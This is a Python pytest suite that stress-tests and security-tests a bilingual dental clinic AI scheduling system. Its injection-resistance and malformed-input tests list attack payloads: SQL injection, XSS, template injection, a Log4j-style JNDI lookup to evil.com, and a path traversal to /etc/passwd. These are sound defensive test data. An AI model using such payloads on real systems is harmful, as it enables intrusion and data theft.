# Comprehensive Aggressive Testing Suite for Dental Clinic AI System
# Version: 1.0.0
# Date: 2025-12-29

import pytest
import asyncio
import time
import random
import concurrent.futures
from fastapi.testclient import TestClient
from src.gateway.main import app
from src.ai_agents.enhanced_message_processor import EnhancedAIMessageProcessor
from src.ai_agents.tools.enhanced_mock_tool import EnhancedMockDentalTool
from src.ai_agents.specialists.receptionist_agent import ReceptionistAgent
from src.ai_agents.specialists.scheduling_agent import SchedulingAgent
from src.ai_agents.specialists.confirmation_agent import ConfirmationAgent

client = TestClient(app)

class TestAggressiveSystemStress:
    """Aggressive stress testing for the entire system."""
    
    def test_high_volume_concurrent_requests(self):
        """Test system under high concurrent load."""
        def make_request():
            response = client.get("/health")
            return response.status_code == 200
        
        # Test with 100 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(100)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        success_rate = sum(results) / len(results)
        assert success_rate >= 0.95, f"Success rate {success_rate} below threshold"
    
    def test_sustained_load_endurance(self):
        """Test system endurance under sustained load."""
        start_time = time.time()
        duration = 30  # 30 seconds
        request_count = 0
        errors = 0
        
        while time.time() - start_time < duration:
            try:
                response = client.get("/api/status")
                if response.status_code != 200:
                    errors += 1
                request_count += 1
                time.sleep(0.1)  # 10 requests per second
            except Exception:
                errors += 1
                request_count += 1
        
        error_rate = errors / request_count if request_count > 0 else 1
        assert error_rate < 0.05, f"Error rate {error_rate} too high"
        assert request_count > 200, f"Too few requests processed: {request_count}"
    
    def test_memory_leak_detection(self):
        """Test for memory leaks during repeated operations."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform 1000 operations
        for i in range(1000):
            response = client.post("/api/process_message", json={"text": f"Test message {i}"})
            if i % 100 == 0:  # Check memory every 100 operations
                current_memory = process.memory_info().rss
                memory_growth = (current_memory - initial_memory) / initial_memory
                assert memory_growth < 0.5, f"Memory growth too high: {memory_growth}"
    
    def test_database_connection_resilience(self):
        """Test database connection handling under stress."""
        mock_tool = EnhancedMockDentalTool()
        
        # Rapid fire database operations
        for i in range(500):
            patients = mock_tool.search_patients("test")
            assert isinstance(patients, list)
            
            # Random patient operations
            if mock_tool.patients:
                patient_id = random.choice(list(mock_tool.patients.keys()))
                patient_details = mock_tool.get_patient_details(patient_id)
                assert patient_details is not None

class TestAggressiveAIAgents:
    """Aggressive testing for AI agents."""
    
    @pytest.mark.asyncio
    async def test_ai_agent_concurrent_processing(self):
        """Test AI agents under concurrent load."""
        processor = EnhancedAIMessageProcessor()
        
        # Test messages in Hebrew and English
        test_messages = [
            "שלום, אני רוצה לקבוע תור לרופא שיניים",
            "Hello, I need to schedule a dental appointment",
            "אני רוצה לבטל את התור שלי",
            "Can you help me reschedule my appointment?",
            "מה השעות הפנויות השבוע?",
            "What are the available times this week?"
        ] * 20  # 120 total messages
        
        async def process_message(msg):
            try:
                result = await processor.process_message(msg)
                return result is not None
            except Exception:
                return False
        
        # Process all messages concurrently
        tasks = [process_message(msg) for msg in test_messages]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success_count = sum(1 for r in results if r is True)
        success_rate = success_count / len(results)
        assert success_rate >= 0.90, f"AI processing success rate {success_rate} too low"
    
    @pytest.mark.asyncio
    async def test_agent_specialization_accuracy(self):
        """Test that agents correctly handle their specialized tasks."""
        receptionist = ReceptionistAgent()
        scheduler = SchedulingAgent()
        confirmation = ConfirmationAgent()
        
        # Test receptionist with greeting messages
        greeting_messages = [
            "שלום, אני רוצה לקבוע תור",
            "Hello, I need help",
            "מה השעות שלכם?",
            "What are your hours?"
        ]
        
        for msg in greeting_messages:
            result = await receptionist.process_message(msg)
            assert "response" in result
            assert len(result["response"]) > 10  # Meaningful response
        
        # Test scheduler with appointment requests
        scheduling_messages = [
            "אני רוצה לקבוע תור לשבוע הבא",
            "I want to schedule an appointment next week",
            "מה השעות הפנויות ביום שלישי?",
            "What times are available on Tuesday?"
        ]
        
        for msg in scheduling_messages:
            result = await scheduler.process_message(msg)
            assert "response" in result
            assert len(result["response"]) > 10
    
    def test_agent_error_handling_resilience(self):
        """Test agent resilience to malformed inputs."""
        processor = EnhancedAIMessageProcessor()
        
        # Test with various malformed inputs
        malformed_inputs = [
            "",  # Empty string
            " " * 1000,  # Very long whitespace
            "א" * 5000,  # Very long Hebrew text
            "🦷" * 100,  # Emoji spam
            "<script>alert('test')</script>",  # XSS attempt
            "SELECT * FROM users;",  # SQL injection attempt
            None,  # None value
            123,  # Number instead of string
            {"invalid": "object"}  # Object instead of string
        ]
        
        errors = 0
        for invalid_input in malformed_inputs:
            try:
                # This should handle errors gracefully
                asyncio.run(processor.process_message(str(invalid_input)))
            except Exception:
                errors += 1
        
        # Allow some errors but not too many
        error_rate = errors / len(malformed_inputs)
        assert error_rate < 0.3, f"Too many errors with malformed input: {error_rate}"

class TestAggressiveDataIntegrity:
    """Aggressive testing for data integrity and consistency."""
    
    def test_mock_data_consistency(self):
        """Test mock data consistency under rapid access."""
        mock_tool = EnhancedMockDentalTool()
        
        # Verify initial data integrity
        assert len(mock_tool.patients) >= 20
        assert len(mock_tool.doctors) >= 4
        
        # Rapid data access and modification
        for i in range(1000):
            # Search operations
            patients = mock_tool.search_patients("test")
            assert isinstance(patients, list)
            
            # Get patient details
            if mock_tool.patients:
                patient_id = random.choice(list(mock_tool.patients.keys()))
                details = mock_tool.get_patient_details(patient_id)
                assert details is not None
                assert "name" in details
                assert "phone" in details
            
            # Appointment operations
            slots = mock_tool.get_available_slots("2025-01-15")
            assert isinstance(slots, list)
    
    def test_appointment_booking_stress(self):
        """Stress test appointment booking system."""
        mock_tool = EnhancedMockDentalTool()
        
        # Try to book many appointments rapidly
        successful_bookings = 0
        failed_bookings = 0
        
        for i in range(100):
            try:
                # Get a random patient and doctor
                if mock_tool.patients and mock_tool.doctors:
                    patient_id = random.choice(list(mock_tool.patients.keys()))
                    doctor_id = random.choice(list(mock_tool.doctors.keys()))
                    
                    # Try to book appointment
                    result = mock_tool.book_appointment(
                        patient_id=patient_id,
                        doctor_id=doctor_id,
                        date="2025-01-20",
                        time="10:00",
                        treatment_type="בדיקה כללית"
                    )
                    
                    if result.get("success"):
                        successful_bookings += 1
                    else:
                        failed_bookings += 1
            except Exception:
                failed_bookings += 1
        
        # Should have reasonable success rate
        total_attempts = successful_bookings + failed_bookings
        if total_attempts > 0:
            success_rate = successful_bookings / total_attempts
            assert success_rate >= 0.7, f"Booking success rate too low: {success_rate}"

class TestAggressiveAPIEndpoints:
    """Aggressive testing for all API endpoints."""
    
    def test_all_endpoints_rapid_fire(self):
        """Test all endpoints with rapid requests."""
        endpoints = [
            ("GET", "/health"),
            ("GET", "/api/status"),
            ("GET", "/api/simulation_status"),
            ("POST", "/api/process_message", {"text": "test message"}),
            ("POST", "/api/search_patients", {}),
            ("POST", "/api/get_providers", {}),
            ("POST", "/api/get_available_slots", {}),
        ]
        
        for method, url, *data in endpoints:
            for i in range(50):  # 50 rapid requests per endpoint
                try:
                    if method == "GET":
                        response = client.get(url)
                    elif method == "POST":
                        payload = data[0] if data else {}
                        response = client.post(url, json=payload)
                    
                    # Should not crash or return 500 errors
                    assert response.status_code != 500, f"Server error on {method} {url}"
                except Exception as e:
                    pytest.fail(f"Exception on {method} {url}: {e}")
    
    def test_api_rate_limiting(self):
        """Test API rate limiting behavior."""
        # Test rate limiting on a limited endpoint
        responses = []
        for i in range(20):  # Try to exceed rate limit
            response = client.post("/api/book_appointment", json={})
            responses.append(response.status_code)
            time.sleep(0.1)
        
        # Should see some rate limiting (429 status codes) if limits are enforced
        # But system should remain stable
        server_errors = sum(1 for code in responses if code >= 500)
        assert server_errors == 0, "Rate limiting should not cause server errors"

class TestAggressiveSecurityAndValidation:
    """Aggressive security and input validation testing."""
    
    def test_injection_attack_resistance(self):
        """Test resistance to various injection attacks."""
        attack_payloads = [
            "'; DROP TABLE patients; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
            "' OR '1'='1",  # SQL injection
            "javascript:alert('xss')",  # JavaScript injection
        ]
        
        for payload in attack_payloads:
            # Test in message processing
            response = client.post("/api/process_message", json={"text": payload})
            assert response.status_code != 500, f"Server crashed on payload: {payload}"
            
            # Response should not contain the raw payload (indicating filtering)
            if response.status_code == 200:
                response_text = str(response.json())
                # Should not echo back dangerous content
                assert "<script>" not in response_text.lower()
                assert "drop table" not in response_text.lower()
    
    def test_large_payload_handling(self):
        """Test handling of extremely large payloads."""
        # Test with very large message
        large_message = "א" * 100000  # 100KB Hebrew text
        
        response = client.post("/api/process_message", json={"text": large_message})
        # Should either handle gracefully or reject with appropriate error
        assert response.status_code in [200, 400, 413, 422], "Unexpected response to large payload"
        assert response.status_code != 500, "Server should not crash on large payload"
    
    def test_unicode_and_encoding_handling(self):
        """Test handling of various Unicode and encoding edge cases."""
        unicode_tests = [
            "🦷👨‍⚕️🏥",  # Emojis
            "שלום עולם",  # Hebrew
            "مرحبا بالعالم",  # Arabic
            "Здравствуй мир",  # Russian
            "你好世界",  # Chinese
            "こんにちは世界",  # Japanese
            "\x00\x01\x02",  # Control characters
            "test\r\ntest\r\n",  # CRLF injection attempt
        ]
        
        for test_text in unicode_tests:
            response = client.post("/api/process_message", json={"text": test_text})
            assert response.status_code != 500, f"Server crashed on Unicode: {repr(test_text)}"

class TestAggressivePerformanceBenchmarks:
    """Performance benchmarking under aggressive conditions."""
    
    def test_response_time_under_load(self):
        """Test response times under various load conditions."""
        response_times = []
        
        # Measure response times for 100 requests
        for i in range(100):
            start_time = time.time()
            response = client.get("/health")
            end_time = time.time()
            
            response_times.append(end_time - start_time)
            assert response.status_code == 200
        
        # Calculate statistics
        avg_response_time = sum(response_times) / len(response_times)
        max_response_time = max(response_times)
        
        # Performance assertions
        assert avg_response_time < 0.1, f"Average response time too high: {avg_response_time}"
        assert max_response_time < 1.0, f"Max response time too high: {max_response_time}"
    
    @pytest.mark.asyncio
    async def test_ai_processing_performance(self):
        """Test AI processing performance under load."""
        processor = EnhancedAIMessageProcessor()
        
        test_messages = [
            "שלום, אני רוצה לקבוע תור",
            "Hello, I need an appointment",
            "מה השעות הפנויות?",
            "What times are available?"
        ]
        
        processing_times = []
        
        for message in test_messages * 25:  # 100 total messages
            start_time = time.time()
            await processor.process_message(message)
            end_time = time.time()
            processing_times.append(end_time - start_time)
        
        avg_processing_time = sum(processing_times) / len(processing_times)
        assert avg_processing_time < 2.0, f"AI processing too slow: {avg_processing_time}"

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
